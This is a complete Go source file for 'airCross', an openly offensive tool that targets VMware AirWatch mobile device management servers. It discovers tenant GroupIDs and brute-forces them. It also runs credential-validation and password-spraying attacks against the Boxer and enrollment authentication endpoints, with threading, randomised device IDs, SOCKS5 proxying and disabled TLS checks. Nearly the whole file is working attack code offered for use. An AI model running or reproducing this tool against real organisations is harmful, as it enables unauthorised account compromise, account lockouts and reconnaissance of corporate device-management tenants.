package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"crypto/rand"
	"crypto/tls"
	"encoding/json"
	"io/ioutil"
	"net/http"

	"golang.org/x/net/proxy"

	URL "net/url"
)

type attack struct {
	agent       string
	debug       int
	email       string
	endpoint    string
	groupID     string
	groups      map[string]int
	file        string
	method      string
	pass        string
	sid         string
	subGroup    string
	subGroupInt int
	samlURL     string
	threads     int
	rudid       bool
	udid        string
	user        string
	proxy       string
	log         *logger
	sleep       string
}

type url struct {
	name   string
	url    string
	data   string
	method string
	opts   *map[string]interface{}
}

type logger struct {
	stdout *log.Logger
	stderr *log.Logger
}

type header struct {
	SID string `json:"SessionId"`
}

type status struct {
	Code         int    `json:"Code"`
	Notification string `json:"Notification"`
	StatusCode   string `json:"StatusCode"`
}

type validate struct {
	Header header `json:"Header"`
	Status status `json:"Status"`
	Next   struct {
		Block      string         `json:"EnrollmentBlockedMessage"`
		Groups     map[string]int `json:"Groups"`
		GroupID    string         `json:"GroupId"`
		Type       int            `json:"Type"`
		GreenBox   string         `json:"GreenBoxUrl"`
		VIDMServer string         `json:"VidmServerUrl"`
		CAPTCHA    bool           `json:"IsCaptchaRequired"`
	} `json:"NextStep"`
}

type discoV1resp struct {
	EnrollURL   string `json:"EnrollmentUrl"`
	GroupID     string `json:"GroupId"`
	TenantGroup string `json:"TenantGroup"`
	GreenboxURL string `json:"GreenboxUrl"`
	MDM         struct {
		ServiceURL string `json:"deviceServicesUrl"`
		APIURL     string `json:"apiServerUrl"`
		GroupID    string `json:"organizationGroupId"`
	} `json:"mdm"`
}

// Program constants
const (
	iosAgent     = `VMwareBoxer/5199 CFNetwork/1121.2.2 Darwin/19.3.0`
	androidAgent = `Agent/20.08.0.23/Android/11`

	version = "2.2"
	tool    = "airCross"
	usage   = `
Usage:
  airCross <method> [OPTIONS] <dom/endpoint> <file>
  airCross -h | -help
  airCross -v

Global Options:
  -h, -help              Show usage
  -a                     User-Agent for request [default: Agent/20.08.0.23/Android/11]
  -t                     Application threads [default: 10]
  -u                     Airwatch username
  -p                     AirWatch password
  -d                     Enable debug output
  -r                     Disable randomize device ID
  -udid                  Device UDID value
  -dom                   Domain to Execute discovery against
  -email                 User email used for enumeration
  -gid                   AirWatch GroupID Value
  -sgid                  AirWatch sub-GroupID Value
  -sint                  AirWatch sub-GroupID INT value (Associated to multiple groups)
  -proxy                 SOCKS5 proxy IP and port for traffic tunneling (aka 127.0.0.1:8081)
  -sleep                 Sleep time between requests (in seconds) [default: 0s]  

  <endpoint>             AirWatch endpoint FQDN
  <dom>                  Discovery domain
  <file>                 Line divided file containing GroupID or UserID values
`
	methods = `
Methods:
  gid-disco              GroupID discovery query
  gid-val                GroupID validation query
  gid-brute              GroupID brute-force enumeration
  auth-boxer             Boxer single-factor authentication attack
  auth-reg               Boxer registration single-factor authentication attack
  auth-val               AirWatch single-factor credential validation attack
  auth-gid               Boxer authentication across multi-group tenants
`

	domainLookupV1           = `https://discovery.awmdm.com/autodiscovery/awcredentials.aws/v1/domainlookup/domain/%s`
	domainLookupV2           = `https://discovery.awmdm.com/autodiscovery/awcredentials.aws/v2/domainlookup/domain/%s`
	gbdomainLookupV2         = `https://discovery.awmdm.com/autodiscovery/DeviceRegistry.aws/v2/gbdomainlookup/domain/%s`
	catalogPortal            = `https://%s/catalog-portal/services/api/adapters`
	emailDiscovery           = `https://%s/DeviceManagement/Enrollment/EmailDiscovery`
	validateGroupIdentifier  = `https://%s/deviceservices/enrollment/airwatchenroll.aws/validategroupidentifier`
	validateGroupSelector    = `https://%s/deviceservices/enrollment/airwatchenroll.aws/validategroupselector`
	authenticationEndpoint   = `https://%s/deviceservices/authenticationendpoint.aws`
	validateLoginCredentials = `https://%s/deviceservices/enrollment/airwatchenroll.aws/validatelogincredentials`

	POSTemailDiscovery             = `DevicePlatformId=2&EmailAddress=%s&FromGroupID=False&FromWelcome=False&Next=Next`
	POSTvalidateGroupIdentifier    = `{"Header":{"SessionId":"00000000-0000-0000-0000-000000000000"},"Device":{"InternalIdentifier":"%s"},"GroupId":"%s"}`
	POSTvalidateGroupSelector      = `{"Header":{"SessionId":"%s"},"Device":{"InternalIdentifier":"%s"},"GroupId":"%s","LocationGroupId":%d}`
	POSTauthenticationEndpointJSON = `{"ActivationCode":"%s","BundleId":"com.box.email","Udid":"%s","Username":"%s",` +
		`"AuthenticationType":"2","RequestingApp":"com.boxer.email","DeviceType":"2","Password":"%s","AuthenticationGroup":"com.air-watch.boxer"}`
	POSTauthenticationEndpointXML = `<AWAuthenticationRequest><Username><![CDATA[%s]]></Username><Password><![CDATA[%s]]></Password>` +
		`<ActivationCode><![CDATA[%s]]></ActivationCode><BundleId><![CDATA[com.boxer.email]]></BundleId><Udid><![CDATA[%s]]>` +
		`</Udid><DeviceType>5</DeviceType><AuthenticationType>2</AuthenticationType><AuthenticationGroup><![CDATA[com.boxer.email]]>` +
		`</AuthenticationGroup></AWAuthenticationRequest>`
	POSTvalidateLoginCredentials = `{"Username":"%s","Password":"%s","Header":{"SessionId":"%s"},"SamlCompleteUrl":"aw:\/\/","Device":{"InternalIdentifier":"%s"}}`
)

// newUDID generates a random UUID according to RFC 4122
func (a *attack) newUDID() {
	uuid := make([]byte, 21)
	n, err := io.ReadFull(rand.Reader, uuid)
	if n != len(uuid) || err != nil {
		fmt.Printf("[*] Error generating UDID: %v\n", err)
	}
	a.udid = fmt.Sprintf("%x", uuid)
}

// webCall is the helper function for executing an HTTP/HTTPS request
func (a *attack) webCall(u *url) []byte {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}
	transport := &http.Transport{TLSClientConfig: tlsConfig}
	if a.proxy != "" {
		socks, _ := proxy.SOCKS5("tcp", a.proxy, nil, &net.Dialer{Timeout: 5 * time.Second})
		transport.Dial = socks.Dial
	}

	client := &http.Client{
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	req := &http.Request{}
	var err error

	req, err = http.NewRequest(u.method, u.url, bytes.NewBuffer([]byte(u.data)))
	if err != nil {
		a.log.Fatalf(nil, "Request Error (%s):  %v", u, err)
	}

	// Switch loop across the []interface{} array
	for k, v := range *u.opts {
		switch k {
		case "Header":
			req.Header = v.(map[string][]string)
		case "CheckRedirect":
			client.CheckRedirect = v.(func(*http.Request, []*http.Request) error)
		}
	}

	if a.debug > 0 {
		a.log.Debugf([]interface{}{u.name}, "REQUEST HEADER: %s %s %s", req.URL, req.Proto, req.Header)
		if a.debug > 1 {
			a.log.Debugf([]interface{}{u.name}, "REQUEST BODY: %s", req.Body)
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		a.log.Errorf([]interface{}{u.name}, "Dial Error: %v", err)
		return nil
	}

	defer resp.Body.Close()
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		a.log.Errorf([]interface{}{u.name}, "Unable to read response: %v", err)
	}
	resp.Body.Close()

	if resp.StatusCode != 200 {
		a.log.Errorf([]interface{}{u.name}, "Invalid Response Code: %s - %d", req.URL.Hostname(), resp.StatusCode)
		return nil
	}

	if a.debug > 1 {
		a.log.Debugf(nil, "RESPONSE BODY: %s", bodyBytes)
	}

	return bodyBytes
}

// disco representes the discovery process to locate and AirWatch
// authentication endpoint and GroupID
func (a *attack) disco() {
	urls := []url{
		url{`domainLookupV1`, fmt.Sprintf(domainLookupV1, a.endpoint), "", `GET`,
			&map[string]interface{}{"Header": map[string][]string{"User-Agent": []string{a.agent}}}},
		url{`domainLookupV2`, fmt.Sprintf(domainLookupV2, a.endpoint), "", `GET`,
			&map[string]interface{}{"Header": map[string][]string{"User-Agent": []string{a.agent}}}},
		url{`gbdomainLookupV2`, fmt.Sprintf(gbdomainLookupV2, a.endpoint), "", `GET`,
			&map[string]interface{}{"Header": map[string][]string{"User-Agent": []string{a.agent}}}},
		url{`catalogPortal`, fmt.Sprintf(catalogPortal, a.samlURL), "", `GET`,
			&map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{a.agent},
					"Content-Type": []string{"application/x-www-form-urlencoded"},
					"Accept":       []string{"gzip, deflate"}}}},
		url{`emailDiscovery`, fmt.Sprintf(emailDiscovery, a.endpoint), fmt.Sprintf(POSTemailDiscovery, a.email), `POST`,
			&map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{a.agent},
					"Content-Type": []string{"application/x-www-form-urlencoded"},
					"Accept":       []string{"gzip, deflate"}},
				"CheckRedirect": func(req *http.Request, via []*http.Request) error {
					if _, ok := req.URL.Query()["sid"]; ok {
						if len(req.URL.Query()["sid"]) < 1 {
							return fmt.Errorf("Invalid SID length - emailDiscovery Failed")
						}
						if req.URL.Query()["sid"][0] == "00000000-0000-0000-0000-000000000000" {
							return fmt.Errorf("Invalid SID - emailDiscovery Disabled")
						}
					} else {
						return fmt.Errorf("emailDiscovery Failed")
					}

					req.URL.Path = "/DeviceManagement/Enrollment/validate-userCredentials"
					return nil
				}}},
	}

	check := false
	for _, u := range urls {
		switch u.name {
		case `emailDiscovery`:
			if a.email == "" {
				a.log.Errorf([]interface{}{u.name}, "Requires user email address")
				continue
			}
		}

		bodyBytes := a.webCall(&u)
		if bodyBytes == nil {
			continue
		}

		bresp := &discoV1resp{}
		err := json.Unmarshal(bodyBytes, bresp)
		if err != nil {
			a.log.Errorf(nil, "Response Marshall Error: %v", err)
		}
		if check = a.validate(bresp); check {
			return
		}
	}
	if !check {
		a.log.Failf(nil, "Discovery Failed")
	}
}

// prof represents the function call to validate the setup
// of the AirWatch environment. Some request methods are executed
// across two queries where details from the first request need to be
// injected to the next.
func (a *attack) prof() {
	check := false
	for i := 0; i < 2; i++ {
		urls := []url{
			url{`validateGroupIdentifier`, fmt.Sprintf(validateGroupIdentifier, a.endpoint),
				fmt.Sprintf(POSTvalidateGroupIdentifier, a.udid, a.groupID), `POST`,
				&map[string]interface{}{
					"Header": map[string][]string{
						"User-Agent":   []string{a.agent},
						"Content-Type": []string{"application/json"}}}},
			url{`validateGroupSelector`, fmt.Sprintf(validateGroupSelector, a.endpoint),
				fmt.Sprintf(POSTvalidateGroupSelector, a.sid, a.udid, a.subGroup, a.subGroupInt), `POST`,
				&map[string]interface{}{
					"Header": map[string][]string{
						"User-Agent":   []string{a.agent},
						"Content-Type": []string{"application/json"}}}},
		}

		bodyBytes := a.webCall(&urls[i])
		if bodyBytes == nil {
			continue
		}

		bresp := &validate{}
		err := json.Unmarshal(bodyBytes, bresp)
		if err != nil {
			a.log.Errorf(nil, "Response Marshall Error: %v", err)
		}
		a.sid = bresp.Header.SID     //Populate SID
		a.groups = bresp.Next.Groups //Populate SubGruops
		if a.method == "auth-val" {
			return
		}
		if len(bresp.Next.Groups) > 0 && (a.subGroup != "" && a.subGroupInt != 0) {
			if a.method == "auth-gid" {
				return
			}
			a.log.Infof([]interface{}{a.endpoint, len(bresp.Next.Groups)}, "SubGroups Available")
			for k, v := range bresp.Next.Groups {
				a.log.Successf([]interface{}{k, v}, "SubGroup Identified")
			}
		} else if a.subGroup != "" && a.subGroupInt != 0 {
			check = a.validate(bresp.Next.Type)
		} else {
			check = a.validate(bresp.Next.Type)
			return
		}
	}
	if !check {
		a.log.Failf(nil, "Profiling Failed")
	}
}

// auth represents the setup framework to build the
// various authentication attack methods
func (a *attack) auth() {
	var file []byte
	var err error

	if a.file != "" {
		file, err = ReadFile(a.file)
		if err != nil {
			a.log.Fatalf([]interface{}{a.file}, "File Read Failure")
		}
	}

	lines := strings.Split(string(file), "\n")
	thread := make(chan bool, len(lines))
	buff := make(chan bool, a.threads)

	wait, err := time.ParseDuration(a.sleep)
	if err != nil {
		a.log.Fatalf([]interface{}{}, "Sleep Timer Error: %v", err)
	}

	if a.method != "auth-gid" {
		a.log.Infof(nil, "threading %d values across %d threads and sleep of %s", len(lines), a.threads, a.sleep)
	}
	for _, line := range lines {
		if len(lines) > 1 && line == "" {
			thread <- true
			continue
		}

		var req url
		target := &attack{}
		*target = *a

		switch target.method {
		case "gid-brute":
			if line != "" {
				target.groupID = line
			}
			req.name = `authenticationEndpoint`
			req.url = fmt.Sprintf(authenticationEndpoint, target.endpoint)
			req.data = fmt.Sprintf(POSTauthenticationEndpointJSON, target.groupID, target.udid, target.user, target.pass)
			req.method = `POST`
			req.opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.agent},
					"Content-Type": []string{"application/json"},
					"Accept":       []string{"application/json; charset=utf-8"}}}

		case "auth-boxer":
			if line != "" {
				target.user = line
			}
			req.name = `authenticationEndpoint`
			req.url = fmt.Sprintf(authenticationEndpoint, target.endpoint)
			req.data = fmt.Sprintf(POSTauthenticationEndpointJSON, target.groupID, target.udid, target.user, target.pass)
			req.method = `POST`
			req.opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.agent},
					"Content-Type": []string{"application/json; charset=utf-8"},
					"Accept":       []string{"application/json; charset=utf-8"}}}

		case "auth-reg":
			if line != "" {
				target.user = line
			}
			req.name = `authenticationEndpoint`
			req.url = fmt.Sprintf(authenticationEndpoint, target.endpoint)
			req.data = fmt.Sprintf(POSTauthenticationEndpointXML, target.user, target.pass, target.groupID, target.rudid)
			req.method = `POST`
			req.opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.agent},
					"Content-Type": []string{"UTF-8"},
					"Accept":       []string{"application/json"}}}

		case "auth-val":
			a.prof() // capture SID
			if line != "" {
				target.user = line
			}

			req.name = `validateLoginCredentials`
			req.url = fmt.Sprintf(validateLoginCredentials, target.endpoint)
			req.data = fmt.Sprintf(POSTvalidateLoginCredentials, target.user, target.pass, target.sid, target.udid)
			req.method = `POST`
			req.opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.agent},
					"Content-Type": []string{"UTF-8"},
					"Accept":       []string{"application/json"}}}

		case "auth-gid":
			target.prof() // capture SubGroups
			if line != "" {
				target.user = line
			}
			a.log.Infof(nil, "threading %d values across %d threads", len(lines)*len(target.groups), target.threads)

			for key, val := range target.groups {
				target.subGroup = key
				target.subGroupInt = val

				req.name = `authenticationEndpoint`
				req.url = fmt.Sprintf(authenticationEndpoint, target.endpoint)
				req.data = fmt.Sprintf(POSTauthenticationEndpointJSON, target.subGroup, target.udid, target.user, target.pass)
				req.method = `POST`
				req.opts = &map[string]interface{}{
					"Header": map[string][]string{
						"User-Agent":   []string{target.agent},
						"Content-Type": []string{"application/json; charset=utf-8"},
						"Accept":       []string{"application/json; charset=utf-8"}}}

				target.thread(&buff, &thread, &req)
			}
			continue
		}

		target.thread(&buff, &thread, &req)
		time.Sleep(wait)
	}

	close(buff)
	for i := 0; i < len(lines); i++ {
		<-thread
	}
	close(thread)

}

// thread represents the threading process to loop multiple requests
func (a *attack) thread(buff, thread *chan bool, req *url) {
	if a.rudid {
		a.newUDID()
	}

	*buff <- true
	go func() {
		bodyBytes := a.webCall(req)
		if bodyBytes == nil {
			a.log.Failf([]interface{}{a.user, a.pass, a.groupID}, "Null Server Response")
		} else {

			if a.method == "auth-val" {
				bresp := &validate{}
				err := json.Unmarshal(bodyBytes, bresp)
				if err != nil {
					a.log.Errorf(nil, "Response Marshall Error: %v", err)
				}
				a.validate(bresp.Next.Type)

			} else {
				bresp := &status{}
				err := json.Unmarshal(bodyBytes, bresp)
				if err != nil {
					a.log.Errorf(nil, "Response Marshall Error: %v", err)
				}
				if bresp.StatusCode == "" {
					a.validate(bresp)
				} else {
					a.validate(bresp.StatusCode)
				}
			}
		}

		<-*buff
		*thread <- true
	}()
}

// validate takes an interface of results and validation details
func (a *attack) validate(res interface{}) bool {
	switch res.(type) {
	case *discoV1resp:
		r := res.(*discoV1resp)
		if r.EnrollURL != "" {
			endp, _ := URL.Parse(r.EnrollURL)
			a.log.Successf([]interface{}{endp.Hostname()}, "Endpoint Discovery")
		} else if r.GreenboxURL != "" {
			endp, _ := URL.Parse(r.GreenboxURL)
			a.samlURL = endp.Hostname()
			a.log.Successf([]interface{}{endp.Hostname()}, "SAML Endpoint Discovery")
			return true
		} else if r.MDM.ServiceURL != "" {
			endp, _ := URL.Parse(r.MDM.ServiceURL)
			a.log.Successf([]interface{}{endp.Hostname()}, "Endpoint Discovery")
			return true
		}
		if r.GroupID != "" {
			a.log.Successf([]interface{}{r.GroupID}, "GroupID Discovery")
			return true
		} else if r.TenantGroup != "" {
			a.log.Successf([]interface{}{r.TenantGroup}, "Tenant Discovery")
			return true
		} else if r.MDM.GroupID != "" {
			a.log.Successf([]interface{}{r.MDM.GroupID}, "GroupID Discovery")
			return true
		}

	case int:
		switch res.(int) {
		case 1:
			a.log.Failf([]interface{}{a.user, a.pass, res.(int)}, "Registration Disabled")
		case 2:
			a.log.Successf([]interface{}{a.user, a.pass, res.(int)}, "AirWatch Single-Factor Registration")
			return true
		case 4:
			a.log.Successf([]interface{}{a.user, a.pass, res.(int)}, "Single-Factor Registration")
			return true
		case 8:
			a.log.Successf([]interface{}{a.user, a.pass, res.(int)}, "Token Registration")
			return true
		case 18:
			a.log.Successf([]interface{}{a.user, a.pass, res.(int)}, "SAML Registration")
			return true
		default:
			a.log.Errorf([]interface{}{a.user, a.pass, res.(int)}, "Unknown Registration")
		}

	case status:
		switch res.(status).Code {
		case 1:
			a.log.Successf([]interface{}{a.user, a.pass}, "Authentication Successful: %s", res.(status).Notification)
			return true
		case 2:
			a.log.Failf([]interface{}{a.user, a.pass}, "Authentication Failure: %s", res.(status).Notification)
		default:
			a.log.Errorf([]interface{}{a.user, a.pass}, "Unknown Response: %s", res.(status).Notification)
		}

	case string:
		switch res.(string) {
		case "AUTH--1":
			a.log.Failf([]interface{}{a.user, a.pass, res.(string)}, "Invalid GroupID")
		case "AUTH-1001":
			a.log.Failf([]interface{}{a.user, a.pass, res.(string)}, "Authentication Failure")
		case "AUTH-1002":
			a.log.Failf([]interface{}{a.user, a.pass, res.(string)}, "Account Lockout")
		case "AUTH-1003":
			a.log.Failf([]interface{}{a.user, a.pass, res.(string)}, "Account Disabled")
		case "AUTH-1006":
			a.log.Successf([]interface{}{a.user, a.pass, res.(string)}, "Authentication Successful")
			return true
		default:
			a.log.Errorf([]interface{}{a.user, a.pass, res.(string)}, "Unknown Response")
		}
	}
	return false
}
func (l *logger) preString(pre []interface{}) string {
	val := ""

	if len(pre) > 0 {
		val += "["
		for i, v := range pre {
			v := fmt.Sprintf("%v", v)
			if v != "" {
				if i > 0 {
					val += ":" + v
				} else {
					val += v
				}
			}
		}
		val += "] "
	}

	return val
}

func (l *logger) Successf(pre []interface{}, data string, v ...interface{}) {
	l.stdout.Printf("[+] "+l.preString(pre)+data+"\n", v...)
}

func (l *logger) Failf(pre []interface{}, data string, v ...interface{}) {
	l.stdout.Printf("[-] "+l.preString(pre)+data+"\n", v...)
}

func (l *logger) Infof(pre []interface{}, data string, v ...interface{}) {
	l.stdout.Printf("[*] "+l.preString(pre)+data+"\n", v...)
}

func (l *logger) Errorf(pre []interface{}, data string, v ...interface{}) {
	l.stderr.Printf("[ERROR] "+l.preString(pre)+data+"\n", v...)
}

func (l *logger) Fatalf(pre []interface{}, data string, v ...interface{}) {
	l.stderr.Printf("[FATAL] "+l.preString(pre)+data+"\n", v...)
	os.Exit(1)
}

func (l *logger) Debugf(pre []interface{}, data string, v ...interface{}) {
	l.stdout.Printf("[DEBUG] "+l.preString(pre)+data+"\n", v...)
}

func (l *logger) StdOut(data string, v ...interface{}) {
	l.stdout.Printf("["+data+"\n", v...)
}

// ReadFile opens file for read access and returns a byte slice
// or error
func ReadFile(file string) ([]byte, error) {
	var out []byte
	f, err := os.Open(file)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	out, _ = ioutil.ReadAll(f)
	f.Close()
	return out, nil
}

func debugLevel(verb ...*bool) int {
	level := 0
	for i, x := range verb {
		if *x {
			level += i + 1
		}
	}
	return level
}

func main() {
	// Global program variable definitions
	var (
		attack = &attack{
			sid: `00000000-0000-0000-0000-000000000000`,
		}
		flAgent   = flag.String("a", "Agent/20.08.0.23/Android/11", "")
		flEmail   = flag.String("email", "", "")
		flGID     = flag.String("gid", "", "")
		flSubGInt = flag.Int("sint", 0, "")
		flSubGID  = flag.String("sgid", "", "")
		flPass    = flag.String("p", "", "")
		flThread  = flag.Int("t", 10, "")
		flRUDID   = flag.Bool("r", true, "")
		flUDID    = flag.String("udid", "", "")
		flUser    = flag.String("u", "", "")
		flVersion = flag.Bool("v", false, "")
		flProxy   = flag.String("proxy", "", "")
		flD1      = flag.Bool("d", false, "")
		flD2      = flag.Bool("dd", false, "")
		flSleep   = flag.String("sleep", "0s", "")
	)

	// Flag parsing
	flag.Usage = func() {
		fmt.Println(usage + methods)
	}
	if len(os.Args) > 1 {
		if !strings.HasPrefix(os.Args[1], "-") {
			attack.method = os.Args[1]
			os.Args = os.Args[1:]
		}
	}

	flag.Parse()
	if *flVersion {
		fmt.Printf("version: %s\n", version)
		os.Exit(0)
	}

	switch len(flag.Args()) {
	case 1:
		attack.endpoint = flag.Arg(0)
	case 2:
		attack.endpoint = flag.Arg(0)
		attack.file = flag.Arg(1)
	default:
		fmt.Println(usage + methods)
		os.Exit(1)
	}

	attack.agent = *flAgent
	attack.email = *flEmail
	attack.groupID = *flGID
	attack.subGroupInt = *flSubGInt
	attack.subGroup = *flSubGID
	attack.pass = *flPass
	attack.threads = *flThread
	attack.rudid = *flRUDID
	attack.udid = *flUDID
	attack.user = *flUser
	attack.proxy = *flProxy
	attack.debug = debugLevel(flD1, flD2)
	attack.sleep = *flSleep
	attack.log = &logger{
		stdout: log.New(os.Stdout, "", 0),
		stderr: log.New(os.Stderr, "", 0),
	}

	if attack.method == "" {
		fmt.Println(usage)
		attack.log.Infof(nil, "Select attack")
	}

	if !attack.rudid && attack.udid == "" {
		attack.log.Fatalf(nil, "40-digit UDID must be provided if randomization is disabled")
	} else if attack.rudid {
		attack.newUDID()
	}

	switch attack.method {
	case "gid-disco":
		attack.disco()
	case "gid-val":
		if attack.groupID == "" && (attack.subGroup == "" || attack.subGroupInt == 0) {
			attack.log.Errorf([]interface{}{attack.method}, "GroupID/SubGroup and/or SubGroupINT required")
			return
		}
		attack.prof()
	case "gid-brute", "auth-boxer", "auth-reg", "auth-gid":
		if attack.user == "" && attack.file == "" {
			attack.log.Errorf([]interface{}{attack.method}, "Username/Password or File/Password required")
			return
		}
		attack.auth()

	case "auth-val":
		if attack.user == "" && attack.file == "" {
			attack.log.Errorf([]interface{}{attack.method}, "User/Password or File/Password required")
			return
		}
		attack.auth()

	default:
		attack.log.StdOut(methods)
		attack.log.Fatalf(nil, "Invalid Method Selected %v", methods)
	}
}
